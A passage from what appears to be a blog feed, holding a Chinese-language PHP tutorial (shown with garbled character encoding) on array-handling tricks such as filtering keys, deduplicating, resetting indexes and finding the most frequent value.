&#123;</span><br><span class="line">            <span class="variable">$new</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$new</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ç”¨ PHP å†…ç½®å‡½æ•°å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">newOnlyKeys</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$keys</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> array_intersect_key(<span class="variable">$array</span>, array_flip(<span class="variable">$keys</span>));</span><br><span class="line">&#125;</span><br><span class="line">var_dump(onlyKeys(<span class="variable">$raw</span>, [<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="comment">// ç»“æœ [&#x27;id&#x27; =&gt; 1, &#x27;name&#x27; =&gt; &#x27;zane&#x27;]</span></span><br><span class="line">var_dump(newOnlyKeys(<span class="variable">$raw</span>, [<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="comment">// ç»“æœ [&#x27;id&#x27; =&gt; 1, &#x27;name&#x27; =&gt; &#x27;zane&#x27;]</span></span><br></pre></td></tr></table></figure><p>ç®€å•çš„ä»‹ç»ä¸€ä¸‹è¿™ä¸¤ä¸ªå‡½æ•°çš„ä½œç”¨ï¼Œé¦–å…ˆæ˜¯ <code>array_flip</code> å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯ã€Œå°†æ•°ç»„çš„é”®å’Œå€¼å¯¹è°ƒã€ï¼Œä¹Ÿå°±æ˜¯é”®åå˜æˆå€¼ï¼Œå€¼å˜æˆé”®åã€‚æˆ‘ä»¬ä¼ é€’çš„ $keys å‚æ•°ç»è¿‡è¿™ä¸ªå‡½æ•°ä¾¿ä» <code>[0 =&gt; &#39;id&#39;, 1 =&gt; &#39;name&#39;]</code> è½¬å˜ä¸ºäº† <code>[&#39;id&#39; =&gt; 0, &#39;name&#39; =&gt; 1]</code>ã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†å‘ <code>array_intersect_key</code> å‡½æ•°æœåŠ¡ï¼Œ<code>array_intersect_key</code> å‡½æ•°çš„åŠŸèƒ½æ˜¯ã€Œä½¿ç”¨é”®åæ¯”è¾ƒè®¡ç®—æ•°ç»„çš„äº¤é›†ã€ï¼Œä¹Ÿå°±æ˜¯è¿”å›ç¬¬ä¸€ä¸ªå‚æ•°æ•°ç»„ä¸­ä¸å…¶ä»–å‚æ•°æ•°ç»„ç›¸åŒé”®åçš„å€¼</p><h3 id="ç§»é™¤æŒ‡å®šé”®å"><a href="#ç§»é™¤æŒ‡å®šé”®å" class="headerlink" title="ç§»é™¤æŒ‡å®šé”®å"></a>ç§»é™¤æŒ‡å®šé”®å</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$raw</span> = [<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;zane&#x27;</span>, <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;123456&#x27;</span>];</span><br><span class="line"><span class="comment">// ç”¨ PHP å†…ç½®å‡½æ•°å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">removeKeys</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$keys</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> array_diff_key(<span class="variable">$array</span>, array_flip(<span class="variable">$keys</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ç§»é™¤ id é”®</span></span><br><span class="line">var_dump(removeKeys(<span class="variable">$raw</span>, [<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line"><span class="comment">// ç»“æœ [&#x27;name&#x27; =&gt; &#x27;zane&#x27;]</span></span><br></pre></td></tr></table></figure><p>å’Œä¸Šä¸€ä¸ªä¾‹å­ç›¸æ¯”æœ¬ä¾‹åªæ˜¯å°† <code>array_intersect_key</code> å‡½æ•°æ”¹ä¸º <code>array_diff_key</code>(åˆšå¥½å’Œ <code>array_intersect_key</code> çš„åŠŸèƒ½ç›¸å)</p><h3 id="æ•°ç»„å»é‡"><a href="#æ•°ç»„å»é‡" class="headerlink" title="æ•°ç»„å»é‡"></a>æ•°ç»„å»é‡</h3><p>PHP å†…ç½®äº† array_unique å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = [<span class="string">&#x27;you are&#x27;</span> =&gt; <span class="number">666</span>, <span class="string">&#x27;i am&#x27;</span> =&gt; <span class="number">233</span>, <span class="string">&#x27;he is&#x27;</span> =&gt; <span class="number">233</span>, <span class="string">&#x27;she is&#x27;</span> =&gt; <span class="number">666</span>];</span><br><span class="line"><span class="variable">$result</span> = array_unique(<span class="variable">$input</span>);</span><br><span class="line">var_dump(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">// ç»“æœ [&#x27;you are&#x27; =&gt; 666, &#x27;i am&#x27; =&gt; 233]</span></span><br></pre></td></tr></table></figure><p>ç”¨è¿™ä¸ªå‡½æ•°å°±èƒ½è§£å†³å¤§éƒ¨åˆ†é—®é¢˜äº†ï¼Œä½†æ˜¯æœ‰æ—¶å€™å¯èƒ½ä¼šè§‰å¾—å®ƒä¸å¤Ÿå¿«ï¼ŒåŸå› å¦‚ä¸‹ï¼š</p><ul><li><p>array_unique() å…ˆå°†å€¼ä½œä¸ºå­—ç¬¦ä¸²æ’åºï¼Œç„¶åå¯¹æ¯ä¸ªå€¼åªä¿ç•™ç¬¬ä¸€ä¸ªé‡åˆ°çš„é”®åï¼Œæ¥ç€å¿½ç•¥æ‰€æœ‰åé¢çš„é”®å</p></li><li><p>å› ä¸ºè¿™ä¸ªå‡½æ•°ä¼šå…ˆå°†æ•°ç»„è¿›è¡Œæ’åºï¼Œæ‰€ä»¥é€Ÿåº¦å¯èƒ½åœ¨æŸäº›åœºæ™¯è¾¾ä¸åˆ°é¢„æœŸçš„è¦æ±‚</p></li></ul><p>ç»­è°ƒç”¨ä¸¤æ¬¡ <code>array_flip</code> å‡½æ•°æ˜¯ä¸æ˜¯å°±ç›¸å½“äºå®ç°äº† <code>array_unique</code> å‡½æ•°çš„åŠŸèƒ½ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = [<span class="string">&#x27;you are&#x27;</span> =&gt; <span class="number">666</span>, <span class="string">&#x27;i am&#x27;</span> =&gt; <span class="number">233</span>, <span class="string">&#x27;he is&#x27;</span> =&gt; <span class="number">233</span>, <span class="string">&#x27;she is&#x27;</span> =&gt; <span class="number">666</span>];</span><br><span class="line"><span class="variable">$result</span> = array_flip(array_flip(<span class="variable">$input</span>));</span><br><span class="line">var_dump(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">// ç»“æœ [&#x27;she is&#x27; =&gt; 666, &#x27;he is&#x27; =&gt; 233]</span></span><br></pre></td></tr></table></figure><p>ç»“æœå’Œ array_unique çš„ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥ä» PHP å®˜æ–¹æ‰‹å†Œå¾—åˆ°ç­”æ¡ˆ</p><blockquote><p>å¦‚æœåŒä¸€ä¸ªå€¼å‡ºç°å¤šæ¬¡ï¼Œåˆ™æœ€åä¸€ä¸ªé”®åå°†ä½œä¸ºå®ƒçš„å€¼ï¼Œå…¶å®ƒé”®ä¼šè¢«ä¸¢å¼ƒ</p></blockquote><p><code>array_unique</code> ä¿ç•™ç¬¬ä¸€ä¸ªå‡ºç°çš„é”®åï¼Œ<code>array_flip </code>ä¿ç•™æœ€åä¸€ä¸ªå‡ºç°çš„é”®å</p><p><strong>æ³¨æ„ï¼š</strong> ä½¿ç”¨ array_flip ä½œä¸ºæ•°ç»„å»é‡æ—¶æ•°ç»„çš„å€¼å¿…é¡»èƒ½å¤Ÿä½œä¸ºé”®åï¼ˆå³ä¸º string ç±»å‹æˆ– integer ç±»å‹ï¼‰ï¼Œå¦åˆ™è¿™ä¸ªå€¼å°†è¢«å¿½ç•¥</p><p>æ­¤å¤–ï¼Œè‹¥ä¸éœ€è¦ä¿ç•™é”®åå¯ä»¥ç›´æ¥è¿™æ ·ä½¿ç”¨ <code>array_values(array_flip($input))</code></p><h3 id="é‡ç½®ç´¢å¼•"><a href="#é‡ç½®ç´¢å¼•" class="headerlink" title="é‡ç½®ç´¢å¼•"></a>é‡ç½®ç´¢å¼•</h3><p>å½“æƒ³è¦å¯¹ä¸€ä¸ªç´¢å¼•å¹¶ä¸è¿ç»­çš„æ•°ç»„è¿›è¡Œé‡ç½®æ—¶ï¼Œæ¯”å¦‚æ•°ç»„ï¼š<code>[0 =&gt; 233, 99 =&gt; 666]</code>ï¼Œå¯¹äºè¿™ç§æ•°ç»„æˆ‘ä»¬åªéœ€è¦è°ƒç”¨ <code>array_values</code> å‡½æ•°å³å¯å®ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = [<span class="number">0</span> =&gt; <span class="number">233</span>, <span class="number">99</span> =&gt; <span class="number">666</span>];</span><br><span class="line">var_dump(array_values(<span class="variable">$input</span>));</span><br><span class="line"><span class="comment">// ç»“æœ [0 =&gt; 233, 1 =&gt; 66]</span></span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ <code>array_values</code> å‡½æ•°å¹¶ä¸æ­¢é‡ç½®æ•°å­—ç´¢å¼•è¿˜ä¼šå°†å­—ç¬¦ä¸²é”®åä¹ŸåŒæ ·åˆ é™¤å¹¶é‡ç½®ï¼Œå¦‚æœæƒ³è¦ä¿ç•™å­—ç¬¦ä¸²é”®åçš„åŒæ—¶é‡ç½®æ•°å­—ç´¢å¼•ï¼Œä½¿ç”¨ <code>array_slice</code> å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = [<span class="string">&#x27;hello&#x27;</span> =&gt; <span class="string">&#x27;world&#x27;</span>, <span class="number">0</span> =&gt; <span class="number">233</span>, <span class="number">99</span> =&gt; <span class="number">666</span>];</span><br><span class="line">var_dump(array_slice(<span class="variable">$input</span>, <span class="number">0</span>));</span><br><span class="line"><span class="comment">// ç»“æœ [&#x27;hello&#x27; =&gt; &#x27;world&#x27;, 0 =&gt; 233, 1 =&gt; 66]</span></span><br></pre></td></tr></table></figure><p><code>array_slice</code> å‡½æ•°çš„åŠŸèƒ½æ˜¯å–å‡ºæ•°ç»„çš„ä¸­çš„ä¸€æ®µï¼Œä½†å®ƒé»˜è®¤ä¼šé‡æ–°æ’åºå¹¶é‡ç½®æ•°ç»„çš„æ•°å­—ç´¢å¼•ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨å®ƒé‡ç½®æ•°ç»„ä¸­çš„æ•°å­—ç´¢å¼•</p><h3 id="æ¸…é™¤ç©ºå€¼"><a href="#æ¸…é™¤ç©ºå€¼" class="headerlink" title="æ¸…é™¤ç©ºå€¼"></a>æ¸…é™¤ç©ºå€¼</h3><p>æœ‰æ—¶å€™æƒ³æ¸…é™¤æŸä¸ªæ•°ç»„ä¸­çš„ç©ºå€¼æ¯”å¦‚ï¼šnullã€falseã€0ã€0.0ã€[]ç©ºæ•°ç»„ã€â€™â€™ç©ºå­—ç¬¦ä¸²ã€â€™0â€™å­—ç¬¦ä¸²0 ï¼Œè¿™æ—¶ <code>array_filter</code> å‡½æ•°ä¾¿èƒ½å¸®ä¸Šå¿™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = [<span class="string">&#x27;foo&#x27;</span>, <span class="literal">false</span>, -<span class="number">1</span>, <span class="literal">null</span>, <span class="string">&#x27;&#x27;</span>, []];</span><br><span class="line">var_dump(array_filter(<span class="variable">$input</span>));</span><br><span class="line"><span class="comment">// ç»“æœ [0 =&gt; &#x27;foo&#x27;, 2 =&gt; -1]</span></span><br></pre></td></tr></table></figure><p>array_filter çš„ä½œç”¨å…¶å®æ˜¯ã€Œç”¨å›è°ƒå‡½æ•°è¿‡æ»¤æ•°ç»„ä¸­çš„å•å…ƒã€ï¼Œå®ƒçš„ç¬¬äºŒä¸ªå‚æ•°å…¶å®æ˜¯ä¸ªå›è°ƒå‡½æ•°ï¼Œå‘æ•°ç»„çš„æ¯ä¸ªæˆå‘˜éƒ½æ‰§è¡Œè¿™ä¸ªå›è°ƒå‡½æ•°ï¼Œè‹¥å›è°ƒå‡½æ•°çš„è¿”å›å€¼ä¸º true ä¾¿ä¿ç•™è¿™ä¸ªæˆå‘˜ï¼Œä¸º false åˆ™å¿½ç•¥ã€‚è¿™ä¸ªå‡½æ•°è¿˜æœ‰ä¸€ä¸ªç‰¹æ€§å°±æ˜¯ï¼š</p><blockquote><p>å¦‚æœæ²¡æœ‰æä¾› callback å‡½æ•°ï¼Œ å°†åˆ é™¤ array ä¸­æ‰€æœ‰ç­‰å€¼ä¸º FALSE çš„æ¡ç›®</p></blockquote><p><strong>æ³¨æ„ï¼š</strong> å¦‚æœä¸å¡«å†™ callback å‡½æ•°ï¼Œ0ã€0.0ã€â€™0â€™å­—ç¬¦ä¸²0 è¿™äº›å¯èƒ½æœ‰æ„ä¹‰çš„å€¼ä¼šè¢«åˆ é™¤ã€‚æ‰€ä»¥å¦‚æœæ¸…é™¤çš„è§„åˆ™æœ‰æ‰€ä¸åŒè¿˜éœ€è¦è‡ªè¡Œç¼–å†™ callback å‡½æ•°</p><h3 id="ç¡®è®¤æ•°ç»„æˆå‘˜å…¨éƒ¨ä¸ºçœŸ"><a href="#ç¡®è®¤æ•°ç»„æˆå‘˜å…¨éƒ¨ä¸ºçœŸ" class="headerlink" title="ç¡®è®¤æ•°ç»„æˆå‘˜å…¨éƒ¨ä¸ºçœŸ"></a>ç¡®è®¤æ•°ç»„æˆå‘˜å…¨éƒ¨ä¸ºçœŸ</h3><p>æœ‰æ—¶å€™æˆ‘ä»¬å¸Œæœ›ç¡®è®¤æ•°ç»„ä¸­çš„çš„å€¼å…¨éƒ¨ä¸º trueï¼Œæ¯”å¦‚ï¼š<code>[&#39;read&#39; =&gt; true, &#39;write&#39; =&gt; true, &#39;execute&#39; =&gt; true]</code>ï¼Œåªéœ€è¦ç”¨ <code>array_product</code> å‡½æ•°ä¾¿å¯ä»¥å®ç°äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$power</span> = [<span class="string">&#x27;read&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;write&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;execute&#x27;</span> =&gt; <span class="literal">true</span>];</span><br><span class="line">var_dump((<span class="keyword">bool</span>)array_product(<span class="variable">$power</span>));</span><br><span class="line"><span class="comment">// ç»“æœ true</span></span><br><span class="line"><span class="variable">$power</span> = [<span class="string">&#x27;read&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;write&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;execute&#x27;</span> =&gt; <span class="literal">false</span>];</span><br><span class="line">var_dump((<span class="keyword">bool</span>)array_product(<span class="variable">$power</span>));</span><br><span class="line"><span class="comment">// ç»“æœ false</span></span><br></pre></td></tr></table></figure><p>array_product å‡½æ•°æœ¬æ¥çš„åŠŸèƒ½æ˜¯ã€Œè®¡ç®—æ•°ç»„ä¸­æ‰€æœ‰å€¼çš„ä¹˜ç§¯ã€ï¼Œåœ¨ç´¯ä¹˜æ•°ç»„ä¸­æ‰€æœ‰æˆå‘˜çš„æ—¶å€™ä¼šå°†æˆå‘˜çš„å€¼è½¬ä¸ºæ•°å€¼ç±»å‹ã€‚å½“ä¼ é€’çš„å‚æ•°ä¸ºä¸€ä¸ª bool  æˆå‘˜æ‰€ç»„æˆçš„æ•°ç»„æ—¶ï¼Œtrue ä¼šè¢«è½¬ä¸º 1ï¼Œfalse ä¼šè¢«è½¬ä¸º 0ã€‚ç„¶ååªè¦æ•°ç»„ä¸­å‡ºç°ä¸€ä¸ª false ç´¯ä¹˜çš„ç»“æœè‡ªç„¶ä¼šå˜æˆ 0ï¼Œç„¶åå†å°†ç»“æœè½¬ä¸º bool ç±»å‹ä¸å°±æ˜¯ false</p><p><strong>æ³¨æ„ï¼š</strong> ä½¿ç”¨ array_product å‡½æ•°å°†åœ¨è®¡ç®—è¿‡ç¨‹ä¸­å°†æ•°ç»„æˆå‘˜è½¬ä¸ºæ•°å€¼ç±»å‹è¿›è¡Œè®¡ç®—ï¼Œæ‰€ä»¥è¯·ç¡®ä¿äº†è§£æ•°ç»„æˆå‘˜è½¬ä¸ºæ•°å€¼ç±»å‹åçš„å€¼ï¼Œå¦åˆ™ä¼šäº§ç”Ÿæ„æ–™ä¹‹å¤–çš„ç»“æœ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$power</span> = [<span class="string">&#x27;read&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;write&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;execute&#x27;</span> =&gt; <span class="string">&#x27;true&#x27;</span>];</span><br><span class="line">var_dump((<span class="keyword">bool</span>)array_product(<span class="variable">$power</span>));</span><br><span class="line"><span class="comment">// ç»“æœ false</span></span><br></pre></td></tr></table></figure><p>å› ä¸º â€˜trueâ€™ åœ¨è®¡ç®—è¿‡ç¨‹ä¸­è¢«è½¬ä¸º 0</p><h3 id="è·å–æŒ‡å®šé”®åä¹‹å‰-ä¹‹åçš„æ•°ç»„"><a href="#è·å–æŒ‡å®šé”®åä¹‹å‰-ä¹‹åçš„æ•°ç»„" class="headerlink" title="è·å–æŒ‡å®šé”®åä¹‹å‰ / ä¹‹åçš„æ•°ç»„"></a>è·å–æŒ‡å®šé”®åä¹‹å‰ / ä¹‹åçš„æ•°ç»„</h3><p>å¦‚æœåªæƒ³è¦å…³è”æ•°ç»„ä¸­æŒ‡å®šé”®åå€¼ä¹‹å‰çš„éƒ¨åˆ†å¯ä»¥é€šè¿‡ <code>array_keys</code>ã€<code>array_search</code> å’Œ <code>array_slice</code> ç»„åˆä½¿ç”¨ä¾¿èƒ½å¤Ÿå®ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = [<span class="string">&#x27;first&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;second&#x27;</span> =&gt; <span class="number">2</span>, <span class="string">&#x27;third&#x27;</span> =&gt; <span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">beforeKey</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$keys</span> = array_keys(<span class="variable">$array</span>);</span><br><span class="line">  <span class="comment">// $keys = [0 =&gt; &#x27;first&#x27;, 1 =&gt; &#x27;second&#x27;, 2 =&gt; &#x27;third&#x27;]</span></span><br><span class="line">    <span class="variable">$len</span> = array_search(<span class="variable">$key</span>, <span class="variable">$keys</span>);</span><br><span class="line">    <span class="keyword">return</span> array_slice(<span class="variable">$array</span>, <span class="number">0</span>, <span class="variable">$len</span>);</span><br><span class="line">&#125;</span><br><span class="line">var_dump(beforeKey(<span class="variable">$data</span>, <span class="string">&#x27;first&#x27;</span>));</span><br><span class="line"><span class="comment">// ç»“æœ []</span></span><br><span class="line">var_dump(beforeKey(<span class="variable">$data</span>, <span class="string">&#x27;second&#x27;</span>));</span><br><span class="line"><span class="comment">// ç»“æœ [&#x27;first&#x27; =&gt; 1]</span></span><br><span class="line">var_dump(beforeKey(<span class="variable">$data</span>, <span class="string">&#x27;third&#x27;</span>));</span><br><span class="line"><span class="comment">// ç»“æœ [&#x27;first&#x27; =&gt; 1, &#x27;second&#x27; =&gt; 2]</span></span><br></pre></td></tr></table></figure><p><code>array_slice</code> è¿™ä¸ªå‡½æ•°å–å‡ºéƒ¨åˆ†æ•°ç»„æ˜¯æ ¹æ®åç§»é‡ï¼ˆå¯ä»¥ç†è§£ä¸ºé”®ååœ¨æ•°ç»„ä¸­çš„é¡ºåºï¼Œä» 0 å¼€å§‹ï¼‰è€Œä¸æ˜¯æ ¹æ®é”®åçš„ï¼Œè€Œå…³è”æ•°ç»„çš„é”®åå´æ˜¯æ˜¯å­—ç¬¦ä¸²æˆ–è€…æ˜¯ä¸æŒ‰é¡ºåºçš„æ•°å­—ï¼Œæ­¤æ—¶è¦è§£å†³çš„é—®é¢˜ä¾¿æ˜¯ã€Œå¦‚ä½•å–åˆ°é”®åå¯¹åº”çš„åç§»é‡ã€</p><p><code>array_keys</code> å‡½æ•°çš„åŠŸèƒ½æ˜¯ã€Œè¿”å›æ•°ç»„ä¸­éƒ¨åˆ†çš„æˆ–æ‰€æœ‰çš„é”®åã€é»˜è®¤è¿”å›å…¨éƒ¨é”®åï¼Œæ­¤å¤–è¿”å›çš„é”®åæ•°ç»„æ˜¯ä»¥æ•°å­—ç´¢å¼•çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿”å›çš„é”®åæ•°ç»„çš„ç´¢å¼•å°±æ˜¯åç§»é‡ï¼Œçš„åŸæ•°ç»„å˜ä¸ºï¼š<code>[0 =&gt; &#39;first&#39;, 1 =&gt; &#39;second&#39;, 2 =&gt; &#39;third&#39;]</code> </p><p>ç„¶åé€šè¿‡ <code>array_search</code> ä¾¿å¯ä»¥è·å¾—æŒ‡å®šé”®åçš„åç§»é‡äº†ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯ã€Œåœ¨æ•°ç»„ä¸­æœç´¢ç»™å®šçš„å€¼ï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å›é¦–ä¸ªç›¸åº”çš„é”®åã€</p><p>æœ‰äº†åç§»é‡ç›´æ¥è°ƒç”¨ <code>array_slice</code> å‡½æ•°ä¾¿å¯ä»¥å®ç°ç›®çš„äº†</p><p>é‚£è·å–æŒ‡å®šé”®åä¹‹åçš„æ•°ç»„ä¹Ÿå°±è½»è€Œæ˜“ä¸¾äº†ï¼Œç•¥å¾®ä¿®æ”¹ array_slice å³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = [<span class="string">&#x27;first&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;second&#x27;</span> =&gt; <span class="number">2</span>, <span class="string">&#x27;third&#x27;</span> =&gt; <span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">afterKey</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$keys</span> = array_keys(<span class="variable">$array</span>);</span><br><span class="line">    <span class="variable">$offset</span> = array_search(<span class="variable">$key</span>, <span class="variable">$keys</span>);</span><br><span class="line">    <span class="keyword">return</span> array_slice(<span class="variable">$array</span>, <span class="variable">$offset</span> + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">var_dump(afterKey(<span class="variable">$data</span>, <span class="string">&#x27;first&#x27;</span>));</span><br><span class="line"><span class="comment">// ç»“æœ [&#x27;second&#x27; =&gt; 2, &#x27;third&#x27; =&gt; 3]</span></span><br><span class="line">var_dump(afterKey(<span class="variable">$data</span>, <span class="string">&#x27;second&#x27;</span>));</span><br><span class="line"><span class="comment">// ç»“æœ [&#x27;third&#x27; =&gt; 3]</span></span><br><span class="line">var_dump(afterKey(<span class="variable">$data</span>, <span class="string">&#x27;third&#x27;</span>));</span><br><span class="line"><span class="comment">// ç»“æœ []</span></span><br></pre></td></tr></table></figure><p>è·å–æŒ‡å®šå€¼ä¹‹å‰æˆ–ä¹‹åçš„æ•°ç»„ï¼Œåªéœ€è°ƒç”¨ <code>beforeKey($data, array_search($value, $data))</code></p><h3 id="æ•°ç»„ä¸­é‡å¤æ¬¡æ•°æœ€å¤šçš„å€¼"><a href="#æ•°ç»„ä¸­é‡å¤æ¬¡æ•°æœ€å¤šçš„å€¼" class="headerlink" title="æ•°ç»„ä¸­é‡å¤æ¬¡æ•°æœ€å¤šçš„å€¼"></a>æ•°ç»„ä¸­é‡å¤æ¬¡æ•°æœ€å¤šçš„å€¼</h3><p>å‡è®¾æœ‰è¿™æ ·ä¸€ä¸ªæ•°ç»„ <code>[6, 11, 11, 2, 4, 4, 11, 6, 7, 4, 2, 11, 8]</code>ï¼Œå¦‚ä½•è·å–æ•°ç»„ä¸­é‡å¤æ¬¡æ•°æœ€å¤šçš„å€¼ï¼Ÿå…³é”®åœ¨äº <code>array_count_values</code> å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = [<span class="number">6</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">8</span>];</span><br><span class="line"><span class="variable">$cv</span> = array_count_values(<span class="variable">$data</span>);</span><br><span class="line"><span class="comment">// $cv = [6 =&gt; 2, 11 =&gt; 4, 2 =&gt; 2, 4 =&gt; 3, 7 =&gt; 1, 8 =&gt; 1]</span></span><br><span class="line">arsort(<span class="variable">$cv</span>);</span><br><span class="line"><span class="variable">$max</span> = key(<span class="variable">$cv</span>);</span><br><span class="line">var_dump(<span class="variable">$max</span>);</span><br><span class="line"><span class="comment">// ç»“æœ 11</span></span><br></pre></td></tr></table></figure><p><code>array_count_values </code>å‡½æ•°çš„åŠŸèƒ½æ˜¯ã€Œç»Ÿè®¡æ•°ç»„ä¸­æ‰€æœ‰çš„å€¼ã€ï¼Œå°±æ˜¯å°†åŸæ•°ç»„ä¸­çš„å€¼ä½œä¸ºè¿”å›æ•°ç»„çš„é”®åï¼Œå€¼å‡ºç°çš„æ¬¡æ•°ä½œä¸ºè¿”å›æ•°ç»„çš„å€¼</p><p>è¿™æ ·ä¾¿å¯ä»¥é€šè¿‡ <code>arsort</code> å‡½æ•°å¯¹å‡ºç°çš„æ¬¡æ•°è¿›è¡Œé™åºæ’åºå¹¶ä¸”ä¿æŒç´¢å¼•å…³è”</p><p>æœ€åä½¿ç”¨ <code>key</code> è·å¾—å½“å‰å•å…ƒï¼ˆå½“å‰å•å…ƒé»˜è®¤ä¸ºæ•°ç»„ç¬¬ä¸€ä¸ªæˆå‘˜ï¼‰çš„é”®åï¼Œæ­¤æ—¶çš„é”®åå³æ˜¯åŸæ•°ç»„çš„å€¼é‡å¤æ¬¡æ•°æœ€å¤šçš„å€¼</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac å®‰è£… PHP æ‰©å±• pcntl</title>
      <link href="post/33840/"/>
      <url>post/33840/</url>
      
